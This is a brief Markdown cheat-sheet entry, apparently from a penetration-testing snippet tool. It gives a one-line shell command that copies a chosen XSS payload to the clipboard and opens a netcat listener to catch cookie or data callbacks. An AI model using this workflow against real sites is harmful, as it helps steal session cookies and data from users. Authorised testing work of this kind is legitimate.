# Xss

## XSS some simple tricks

### XSS payload + listener

Copy a chosen XSS payload to clipboard and start a netcat listener for the cookie/data callback. Streamlines the paste-and-wait loop.

```sh title:"Copy XSS payload to clipboard, start nc listener"
echo '$xss_payloads' | xclip -sel clip && nc -lvnp $lport
```
<!-- cheat
import webserver
import tun_ip
import xss_quick_payloads
var port
-->

